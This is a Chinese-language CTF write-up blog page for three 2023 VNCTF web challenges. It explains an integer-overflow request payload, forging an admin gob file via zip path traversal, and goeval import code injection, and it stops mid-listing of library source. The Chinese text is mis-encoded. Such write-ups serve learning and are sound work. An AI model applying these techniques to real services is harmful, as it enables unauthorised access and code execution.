<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="2023VNCTF Web" />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* ç®­å¤´çš„é¢œè‰² */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* è¾¹æ¡†çš„é¢œè‰² */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* é¼ æ ‡æ»‘è¿‡çš„ç®­å¤´é¢œè‰² */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* è®¾ç½®æ»šåŠ¨æ¡æ‹–åŠ¨å—çš„é¢œè‰² */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">ä¸€åˆ‡éƒ½æ˜¯å…´è¶£ä½¿ç„¶</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">æ–‡ç« </a></li>
            
        
            
                <li><a href="/tags/">æ ‡ç­¾</a></li>
            
        
            
                <li><a href="/categories/">åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">å…³äº</a></li>
            
        
            
                <li><a href="/friends/">å‹é“¾</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            2023VNCTF Web
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90"><span class="post-toc-text">è±¡æ£‹ç‹å­</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E7%94%B5%E5%AD%90%E6%9C%A8%E9%B1%BC"><span class="post-toc-text">ç”µå­æœ¨é±¼</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BabyGo"><span class="post-toc-text">BabyGo</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="post-toc-text">0x00 å‰è¨€</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 æºç åˆ†æ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x02 é¢˜è§£</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="post-toc-text">æ–¹æ³•ä¸€ ä»£ç æ³¨å…¥</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E4%BD%BF%E7%94%A8%E5%88%AB%E5%90%8D%E6%89%A7%E8%A1%8C%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8C%85"><span class="post-toc-text">æ–¹æ³•äºŒ ä½¿ç”¨åˆ«åæ‰§è¡Œè‡ªå·±çš„åŒ…</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="post-toc-text">0x03 å‚è€ƒæ–‡ç« </span></a></li></ol></li></ol>
            
        
        <p>æ¯”èµ›çš„æ—¶å€™åœ¨å›å­¦æ ¡çš„è·¯ä¸Šï¼Œæ‰€ä»¥æ²¡æœ‰æ‰“ï¼Œå¬è¯´è´¨é‡æŒºé«˜ï¼Œèµ›ååšä¸€ä¸‹</p>
<h1 id="è±¡æ£‹ç‹å­"><a href="#è±¡æ£‹ç‹å­" class="headerlink" title="è±¡æ£‹ç‹å­"></a>è±¡æ£‹ç‹å­</h1><p>ä¸€ä¸ªæ™®é€šçš„jsæ¸¸æˆï¼Œç©è¿‡å…³äº†å°±ç»™flagï¼Œæ‰€ä»¥flagè‚¯å®šåœ¨å‰ç«¯æºç é‡Œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191508972.png" alt="image-20230219150751192"></p>
<p>è¿™é‡Œå°±æ˜¯å¼¹flagçš„jsï¼Œåªä¸è¿‡è¢«æ··æ·†äº†ï¼Œç›´æ¥å¤åˆ¶åˆ°æ§åˆ¶å°æ‰§è¡Œå°±è¡Œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191508558.png" alt="image-20230219150828450"></p>
<h1 id="ç”µå­æœ¨é±¼"><a href="#ç”µå­æœ¨é±¼" class="headerlink" title="ç”µå­æœ¨é±¼"></a>ç”µå­æœ¨é±¼</h1><p>ä¸€ä¸ªæ•´æ•°æº¢å‡º</p>
<p>æºç </p>
<pre><code class="rust">use actix_files::Files;
use actix_web::&#123;
    error, get, post,
    web::&#123;self, Json&#125;,
    App, Error, HttpResponse, HttpServer,
&#125;;
use once_cell::sync::Lazy;
use serde::&#123;Deserialize, Serialize&#125;;
use std::sync::&#123;Arc, Mutex&#125;;
use tera::&#123;Context, Tera&#125;;

static GONGDE: Lazy&lt;ThreadLocker&lt;i32&gt;&gt; = Lazy::new(|| ThreadLocker::from(0));

#[derive(Debug, Clone, Default)]
struct ThreadLocker&lt;T&gt; &#123;
    value: Arc&lt;Mutex&lt;T&gt;&gt;,
&#125;

impl&lt;T: Clone&gt; ThreadLocker&lt;T&gt; &#123;
    fn get(&amp;self) -&gt; T &#123;
        let mutex = self.value.lock().unwrap();
        mutex.clone()
    &#125;
    fn set(&amp;self, val: T) &#123;
        let mut mutex = self.value.lock().unwrap();
        *mutex = val;
    &#125;
    fn from(val: T) -&gt; ThreadLocker&lt;T&gt; &#123;
        ThreadLocker::&lt;T&gt; &#123;
            value: Arc::new(Mutex::new(val)),
        &#125;
    &#125;
&#125;

#[derive(Serialize)]
struct APIResult &#123;
    success: bool,
    message: &amp;&#39;static str,
&#125;

#[derive(Deserialize)]
struct Info &#123;
    name: String,
    quantity: i32,
&#125;

#[derive(Debug, Copy, Clone, Serialize)]
struct Payload &#123;
    name: &amp;&#39;static str,
    cost: i32,
&#125;

const PAYLOADS: &amp;[Payload] = &amp;[
    Payload &#123;
        name: &quot;Cost&quot;,
        cost: 10,
    &#125;,
    Payload &#123;
        name: &quot;Loan&quot;,
        cost: -1_000,
    &#125;,
    Payload &#123;
        name: &quot;CCCCCost&quot;,
        cost: 500,
    &#125;,
    Payload &#123;
        name: &quot;Donate&quot;,
        cost: 1,
    &#125;,
    Payload &#123;
        name: &quot;Sleep&quot;,
        cost: 0,
    &#125;,
];

#[get(&quot;/&quot;)]
async fn index(tera: web::Data&lt;Tera&gt;) -&gt; Result&lt;HttpResponse, Error&gt; &#123;
    let mut context = Context::new();

    context.insert(&quot;gongde&quot;, &amp;GONGDE.get());

    if GONGDE.get() &gt; 1_000_000_000 &#123;
        context.insert(
            &quot;flag&quot;,
            &amp;std::env::var(&quot;FLAG&quot;).unwrap_or_else(|_| &quot;flag&#123;test_flag&#125;&quot;.to_string()),
        );
    &#125;

    match tera.render(&quot;index.html&quot;, &amp;context) &#123;
        Ok(body) =&gt; Ok(HttpResponse::Ok().body(body)),
        Err(err) =&gt; Err(error::ErrorInternalServerError(err)),
    &#125;
&#125;

#[get(&quot;/reset&quot;)]
async fn reset() -&gt; Json&lt;APIResult&gt; &#123;
    GONGDE.set(0);
    web::Json(APIResult &#123;
        success: true,
        message: &quot;é‡å¼€æˆåŠŸï¼Œç»§ç»­æŒ‘æˆ˜ä½›ç¥–å§&quot;,
    &#125;)
&#125;

#[post(&quot;/upgrade&quot;)]
async fn upgrade(body: web::Form&lt;Info&gt;) -&gt; Json&lt;APIResult&gt; &#123;
    if GONGDE.get() &lt; 0 &#123;
        return web::Json(APIResult &#123;
            success: false,
            message: &quot;åŠŸå¾·éƒ½ææˆè´Ÿæ•°äº†ï¼Œä½›ç¥–å¯¹ä½ å¾ˆå¤±æœ›&quot;,
        &#125;);
    &#125;

    if body.quantity &lt;= 0 &#123;
        return web::Json(APIResult &#123;
            success: false,
            message: &quot;ä½›ç¥–é¢å‰éƒ½æ•¢ä½œå¼Šï¼ŒçœŸä¸æ€•é­æŠ¥åº”å•Š&quot;,
        &#125;);
    &#125;

    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) &#123;
        let mut cost = payload.cost;

        if payload.name == &quot;Donate&quot; || payload.name == &quot;Cost&quot; &#123; //åªæœ‰è¿™ä¸¤ä¸ªä¼šç»™costç¿»å€æ•°
            cost *= body.quantity;
        &#125;

        if GONGDE.get() &lt; cost as i32 &#123;
            return web::Json(APIResult &#123;
                success: false,
                message: &quot;åŠŸå¾·ä¸è¶³&quot;,
            &#125;);
        &#125;

        if cost != 0 &#123;
            GONGDE.set(GONGDE.get() - cost as i32);
        &#125;

        if payload.name == &quot;Cost&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;å°æ‰£ä¸€æ‰‹åŠŸå¾·&quot;,
            &#125;);
        &#125; else if payload.name == &quot;CCCCCost&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;åŠŸå¾·éƒ½å¿«æ‰£æ²¡äº†ï¼Œæ€ä¹ˆç¡å¾—ç€çš„&quot;,
            &#125;);
        &#125; else if payload.name == &quot;Loan&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;æˆ‘å‘ä½›ç¥–è®¸æ„¿ï¼Œä½›ç¥–å€Ÿæˆ‘åŠŸå¾·ï¼Œå¿«è¯´è°¢è°¢ä½›ç¥–&quot;,
            &#125;);
        &#125; else if payload.name == &quot;Donate&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;å¥½äººæœ‰å¥½æŠ¥&quot;,
            &#125;);
        &#125; else if payload.name == &quot;Sleep&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;è¿™æ˜¯ä»€ä¹ˆï¼ŸåºŠï¼Œç¡ä¸€ä¸‹&quot;,
            &#125;);
        &#125;
    &#125;

    web::Json(APIResult &#123;
        success: false,
        message: &quot;ç¦æ­¢å¼€æ‘†&quot;,
    &#125;)
&#125;

#[actix_web::main]
async fn main() -&gt; std::io::Result&lt;()&gt; &#123;
    let port = std::env::var(&quot;PORT&quot;)
        .unwrap_or_else(|_| &quot;2333&quot;.to_string())
        .parse()
        .expect(&quot;Invalid PORT&quot;);

    println!(&quot;Listening on 0.0.0.0:&#123;&#125;&quot;, port);

    HttpServer::new(move || &#123;
        let tera = match Tera::new(&quot;src/templates/**/*.html&quot;) &#123;
            Ok(t) =&gt; t,
            Err(e) =&gt; &#123;
                println!(&quot;Error: &#123;&#125;&quot;, e);
                ::std::process::exit(1);
            &#125;
        &#125;;
        App::new()
            .app_data(web::Data::new(tera))
            .service(Files::new(&quot;/asset&quot;, &quot;src/templates/asset/&quot;).prefer_utf8(true))
            .service(index)
            .service(upgrade)
            .service(reset)
    &#125;)
    .bind((&quot;0.0.0.0&quot;, port))?
    .run()
    .await
&#125;
</code></pre>
<p>i32çš„èŒƒå›´æ˜¯-2147483648åˆ°2147483647ï¼Œæ‰€ä»¥åªè¦åœ¨Costé‚£å°†å‡çš„æ•°é‡å˜æˆå¤§äº2147483648ï¼Œå°±å¯ä»¥é€ æˆæº¢å‡ºï¼Œä»è€Œå¾—åˆ°flag</p>
<p>åœ¨<code>/upgrade</code>è·¯ç”±</p>
<pre><code class="bash">name=Cost&amp;quantity=214748365
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302211113243.png" alt="image-20230221111324074"></p>
<h1 id="BabyGo"><a href="#BabyGo" class="headerlink" title="BabyGo"></a>BabyGo</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è¿™é¢˜åœ¨æœºåœºç­‰åŒå­¦çš„æ—¶å€™åšäº†ä¸€ä¸‹ï¼Œä½†æ˜¯é‚£ä¸ªè§£å‹åŠŸèƒ½ä¸€ç›´æŠ¥é”™ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯æˆ‘çš„é—®é¢˜ï¼Œç»“æ„ç¬¬äºŒå¤©åšä¸€ä¸‹å‘ç°æ˜¯å¯ä»¥çš„</p>
<ul>
<li>goevalä»£ç æ³¨å…¥</li>
<li>filepath.Cleanæ„é€ ä»»æ„è§£å‹è·¯å¾„</li>
</ul>
<h2 id="0x01-æºç åˆ†æ"><a href="#0x01-æºç åˆ†æ" class="headerlink" title="0x01 æºç åˆ†æ"></a>0x01 æºç åˆ†æ</h2><pre><code class="go">package main

import (
    &quot;encoding/gob&quot;
    &quot;fmt&quot;
    &quot;github.com/PaulXu-cn/goeval&quot;
    &quot;github.com/duke-git/lancet/cryptor&quot;
    &quot;github.com/duke-git/lancet/fileutil&quot;
    &quot;github.com/duke-git/lancet/random&quot;
    &quot;github.com/gin-contrib/sessions&quot;
    &quot;github.com/gin-contrib/sessions/cookie&quot;
    &quot;github.com/gin-gonic/gin&quot;
    &quot;net/http&quot;
    &quot;os&quot;
    &quot;path/filepath&quot;
    &quot;strings&quot;
)

type User struct &#123;
    Name  string
    Path  string
    Power string
&#125;

func main() &#123;
    r := gin.Default()
    store := cookie.NewStore(random.RandBytes(16))
    r.Use(sessions.Sessions(&quot;session&quot;, store))
    r.LoadHTMLGlob(&quot;template/*&quot;)

    r.GET(&quot;/&quot;, func(c *gin.Context) &#123;
        userDir := &quot;/tmp/&quot; + cryptor.Md5String(c.ClientIP()+&quot;VNCTF2023GoGoGo~&quot;) + &quot;/&quot;
        session := sessions.Default(c)
        session.Set(&quot;shallow&quot;, userDir)
        session.Save()
        fileutil.CreateDir(userDir)
        gobFile, _ := os.Create(userDir + &quot;user.gob&quot;)
        user := User&#123;Name: &quot;ctfer&quot;, Path: userDir, Power: &quot;low&quot;&#125;
        encoder := gob.NewEncoder(gobFile)
        encoder.Encode(user)
        if fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+&quot;user.gob&quot;) &#123;
            c.HTML(200, &quot;index.html&quot;, gin.H&#123;&quot;message&quot;: &quot;Your path: &quot; + userDir&#125;)
            return
        &#125;
        c.HTML(500, &quot;index.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to make user dir&quot;&#125;)
    &#125;)

    r.GET(&quot;/upload&quot;, func(c *gin.Context) &#123;
        c.HTML(200, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;upload me!&quot;&#125;)
    &#125;)

    r.POST(&quot;/upload&quot;, func(c *gin.Context) &#123;
        session := sessions.Default(c)
        if session.Get(&quot;shallow&quot;) == nil &#123;
            c.Redirect(http.StatusFound, &quot;/&quot;)
        &#125;
        userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot;
        fileutil.CreateDir(userUploadDir)
        file, err := c.FormFile(&quot;file&quot;)
        if err != nil &#123;
            c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;no file upload&quot;&#125;)
            return
        &#125;
        ext := file.Filename[strings.LastIndex(file.Filename, &quot;.&quot;):]
        if ext == &quot;.gob&quot; || ext == &quot;.go&quot; &#123;
            c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;Hacker!&quot;&#125;)
            return
        &#125;
        filename := userUploadDir + file.Filename
        if fileutil.IsExist(filename) &#123;
            fileutil.RemoveFile(filename)
        &#125;
        err = c.SaveUploadedFile(file, filename)
        if err != nil &#123;
            c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to save file&quot;&#125;)
            return
        &#125;
        c.HTML(200, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;file saved to &quot; + filename&#125;)
    &#125;)

    r.GET(&quot;/unzip&quot;, func(c *gin.Context) &#123;
        session := sessions.Default(c)
        if session.Get(&quot;shallow&quot;) == nil &#123;
            c.Redirect(http.StatusFound, &quot;/&quot;)
        &#125;
        userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot;
        files, _ := fileutil.ListFileNames(userUploadDir)
        destPath := filepath.Clean(userUploadDir + c.Query(&quot;path&quot;))
        for _, file := range files &#123;
            if fileutil.MiMeType(userUploadDir+file) == &quot;application/zip&quot; &#123;
                err := fileutil.UnZip(userUploadDir+file, destPath)
                if err != nil &#123;
                    c.HTML(200, &quot;zip.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to unzip file&quot;&#125;)
                    return
                &#125;
                fileutil.RemoveFile(userUploadDir + file)
            &#125;
        &#125;
        c.HTML(200, &quot;zip.html&quot;, gin.H&#123;&quot;message&quot;: &quot;success unzip&quot;&#125;)
    &#125;)

    r.GET(&quot;/backdoor&quot;, func(c *gin.Context) &#123;
        session := sessions.Default(c)
        if session.Get(&quot;shallow&quot;) == nil &#123;
            c.Redirect(http.StatusFound, &quot;/&quot;)
        &#125;
        userDir := session.Get(&quot;shallow&quot;).(string)
        if fileutil.IsExist(userDir + &quot;user.gob&quot;) &#123;
            file, _ := os.Open(userDir + &quot;user.gob&quot;)
            decoder := gob.NewDecoder(file)
            var ctfer User
            decoder.Decode(&amp;ctfer)
            if ctfer.Power == &quot;admin&quot; &#123;
                eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))
                if err != nil &#123;
                    fmt.Println(err)
                &#125;
                c.HTML(200, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: string(eval)&#125;)
                return
            &#125; else &#123;
                c.HTML(200, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: &quot;low power&quot;&#125;)
                return
            &#125;
        &#125; else &#123;
            c.HTML(500, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: &quot;no such user gob&quot;&#125;)
            return
        &#125;
    &#125;)

    r.Run(&quot;:80&quot;)
&#125;
</code></pre>
<p>æ€»ä½“æ¥è¯´ä¸æ˜¯å¤ªéš¾ç†è§£</p>
<p><code>/</code>è·¯ç”±ï¼Œç”Ÿæˆä¸€ä¸ª<code>userDir</code>å¹¶ä¿å­˜åœ¨<code>Session</code>é‡Œï¼Œåé¢çš„éƒ¨åˆ†éƒ½ä¼šä»Sessionå–è¿™ä¸ªçš„å€¼è¿›è¡Œæ“ä½œ<br>å¹¶ä¸”è¿˜ä¼šåˆ›å»ºä¸€ä¸ª<code>user.gob</code>æ–‡ä»¶ï¼Œå°†Userä¿¡æ¯ä¿å­˜åœ¨é‡Œé¢</p>
<p><code>/upload</code>è·¯ç”±ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ°userDir+â€uploads&#x2F;â€œç›®å½•ï¼Œå¹¶ä¸”ä¼šæ£€æµ‹æ–‡ä»¶åç¼€</p>
<p><code>/unzip</code>è·¯ç”±ï¼Œä¼šå¯¹userDir+â€uploads&#x2F;â€œç›®å½•é‡Œçš„zipæ–‡ä»¶è¿›è¡Œè§£å‹ï¼Œä¸”ç›®çš„è·¯å¾„å¯æ§ï¼Œæ¥å—GETä¼ å‚çš„pathçš„å€¼</p>
<pre><code class="go">destPath := filepath.Clean(userUploadDir + c.Query(&quot;path&quot;))
</code></pre>
<p>ç„¶åæ¥çœ‹çœ‹è¿™ä¸ª<code>filepath.Clean</code>æ˜¯ä»€ä¹ˆä¸œè¥¿</p>
<blockquote>
<p>Cleané€šè¿‡çº¯è¯æ³•å¤„ç†è¿”å›ä¸pathç›¸å½“çš„æœ€çŸ­è·¯å¾„åç§°ã€‚å®ƒåå¤åº”ç”¨ä»¥ä¸‹è§„åˆ™ï¼Œç›´åˆ°ä¸èƒ½å†åšè¿›ä¸€æ­¥å¤„ç†ã€‚</p>
<ol>
<li><p>ç”¨ä¸€ä¸ªå…ƒç´ æ›¿æ¢å¤šä¸ªSeparatorå…ƒç´ ã€‚</p>
</li>
<li><p>æ¶ˆé™¤æ¯ä¸ª.è·¯å¾„åå…ƒç´ ï¼ˆå½“å‰ç›®å½•ï¼‰ã€‚</p>
</li>
<li><p>æ¶ˆé™¤æ¯ä¸ªå†…éƒ¨çš„..è·¯å¾„åç§°å…ƒç´ ï¼ˆçˆ¶ç›®å½•ï¼‰å’Œå®ƒå‰é¢çš„é..å…ƒç´ ã€‚</p>
</li>
<li><p>æ¶ˆé™¤äº†å°†..æ”¾åœ¨æ ¹è·¯å¾„åé¢çš„æƒ…å†µï¼ˆâ€™&#x2F;..â€™)ï¼šä¹Ÿå°±æ˜¯è¯´ï¼Œå‡è®¾Separatoræ˜¯â€™&#x2F;â€˜ï¼Œåœ¨ä¸€ä¸ªè·¯å¾„çš„å¼€å¤´ç”¨â€&#x2F;â€œæ›¿æ¢â€&#x2F;..â€ã€‚</p>
</li>
<li><p>è¿”å›çš„è·¯å¾„åªæœ‰åœ¨ä»£è¡¨æ ¹ç›®å½•æ—¶æ‰ä»¥æ–œçº¿ç»“å°¾ï¼Œä¾‹å¦‚Unixç³»ç»Ÿä¸­çš„â€&#x2F;â€œæˆ–Windowsç³»ç»Ÿä¸­çš„<code>C:</code></p>
</li>
</ol>
<p>æœ€åï¼Œä»»ä½•å‡ºç°çš„æ–œçº¿éƒ½è¢«Separatoræ›¿æ¢ã€‚</p>
<p>å¦‚æœè¿™ä¸ªè¿‡ç¨‹çš„ç»“æœæ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼ŒCleanè¿”å›å­—ç¬¦ä¸²â€.â€ã€‚</p>
<p>from <a target="_blank" rel="noopener" href="https://pkg.go.dev/path/filepath#Clean">https://pkg.go.dev/path/filepath#Clean</a></p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ è·¯å¾„ï¼Œå°†æ–‡ä»¶è§£å‹åˆ°ä»»ä½•æˆ‘ä»¬å¯ä»¥è§£å‹çš„åœ°æ–¹</p>
<p><code>/backdoor</code>è·¯ç”±ï¼Œä¼šä»userDirç›®å½•è¯»å–<code>user.gob</code>æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶æ£€æµ‹<code>Power</code>é”®çš„å€¼æ˜¯å¦ä¸ºâ€adminâ€ï¼Œå¦‚æœä¸ºTrueï¼Œå°±æ‰§è¡Œ</p>
<pre><code class="go">eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))
</code></pre>
<p>å¹¶è¿”å›æ‰§è¡Œç»“æœ</p>
<p>æ‰€ä»¥å¯ä»¥åœ¨æœ¬åœ°æ„é€ ä¸€ä¸ªuser.gobï¼Œå°†<code>Power</code>çš„å€¼æ”¹ä¸ºâ€adminâ€å¹¶å°†å…¶å‹ç¼©ï¼Œç„¶åä¸Šä¼ å¹¶è§£å‹åˆ°userDirç›®æ ‡è¦†ç›–åŸæ¥çš„user.gobï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸæ‰§è¡Œåˆ°<code>goeval.Eval()</code>äº†</p>
<p>è€Œåœ¨<code>goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))</code>é‡Œå¯ä»¥å‘ç°å¹¶æ²¡æœ‰å¯ä»¥ç›´æ¥æ‰§è¡Œä»»æ„ä»£ç çš„åœ°æ–¹ï¼Œå¯æ§çš„åªæœ‰ç¬¬ä¸‰ä¸ªå‚æ•°</p>
<p><code>goeval.Eval()</code>çš„ç¬¬ä¸‰å‚æ•°å¯ä»¥è¿›è¡ŒåŒ…çš„å¯¼å…¥ï¼Œå› ä¸ºé€šè¿‡æŠ¥é”™å¯ä»¥æ‰§è¡Œé¢˜ç›®ç¯å¢ƒGOçš„srcç›®å½•ï¼Œæ‰€ä»¥æˆ‘æœ€å¼€å§‹æƒ³çš„æ˜¯åœ¨fmtåŒ…é‡Œå¯¼å…¥ä¸€ä¸ªå‡½æ•°<code>Println</code>ï¼Œè¿™æ ·åœ¨æ‰§è¡Œ<code>goeval.Eval()</code>çš„æ—¶å€™å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬è‡ªå·±æ„é€ çš„ä»£ç ã€‚</p>
<p>ä½†æ˜¯æˆ‘æƒ³å°‘äº†ï¼Œå¦‚æœç›´æ¥å°†pkgä¼ å‚ä¸ºfmtçš„è¯ï¼Œå› ä¸ºåœ¨Println()è¢«fmtåŒ…é‡Œçš„å…¶ä»–æ–‡ä»¶è¢«å®šä¹‰è¿‡ï¼Œæ‰€ä»¥æˆ‘è¿™å†å®šä¹‰ä¸€ä¸ªå°±ä¼šæŠ¥é”™</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191556105.png" alt="image-20230219155657021"></p>
<p>ç„¶åæˆ‘å°±éšæ‰‹æœäº†ä¸€ä¸‹goeval.Evalï¼Œå°±å‘ç°äº†å¯ä»¥å¯¹goeval.Evalè¿›è¡Œä»£ç æ³¨å…¥ï¼Œä»è€Œè¿œç¨‹æ‰§è¡Œä»£ç </p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191557626.png" alt="image-20230219155756587"></p>
<p>æ ¹æ®è¿™ç¯‡æ–‡ä»¶å»çœ‹çœ‹goeval.Evalçš„<a target="_blank" rel="noopener" href="https://github.com/PaulXu-cn/goeval/blob/v0.1.1/eval.go#L44">æºç </a></p>
<pre><code class="go">func Eval(defineCode string, code string, imports ...string) (re []byte, err error) &#123;
    var (
        tmp = `package main
%s
%s
func main() &#123;
%s
&#125;
`
        importStr string
        fullCode string
     	newTmpDir = tempDir + dirSeparator + RandString(8)
    )

    if 0 &lt; len(imports) &#123;
        importStr = &quot;import (&quot;
        for _, item := range imports &#123;
            if blankInd := strings.Index(item, &quot; &quot;); -1 &lt; blankInd &#123;
